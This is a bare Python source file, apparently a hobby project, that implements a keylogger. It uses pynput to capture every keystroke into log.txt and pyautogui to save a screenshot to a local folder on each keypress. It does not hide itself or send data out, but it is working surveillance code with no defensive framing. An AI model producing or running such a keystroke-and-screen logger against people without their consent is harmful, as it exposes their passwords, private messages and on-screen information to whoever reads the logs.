import pynput
import pyautogui
 
from pynput.keyboard import Key, Listener 
i=0   
keys = [] 
   
def on_press(key): 
      
    keys.append(key) 
    write_file(keys) 
    take_ss()
      
    try: 
        print('alphanumeric key {0} pressed'.format(key.char)) 
          
    except AttributeError: 
        print('special key {0} pressed'.format(key)) 
           
def write_file(keys): 
      
    with open('log.txt', 'w') as f: 
        for key in keys: 
              
            # removing '' 
            k = str(key).replace("'", "") 
            f.write(k)
                      
            # explicitly adding a space after  
            # every keystroke for readability 
            f.write(' ')  
               
def on_release(key): 
                      
    print('{0} released'.format(key)) 
    if key == Key.esc: 
        # Stop listener 
        return False
        
#takes a screenshot    
def take_ss():
	global i 
	myScreenshot = pyautogui.screenshot()
	myScreenshot.save(r'/home/hydra/mouse_log/screenshots/test' + str(i) + '.png')
	i+=1
   
with Listener(on_press = on_press, on_release = on_release) as listener:
	listener.join()

	
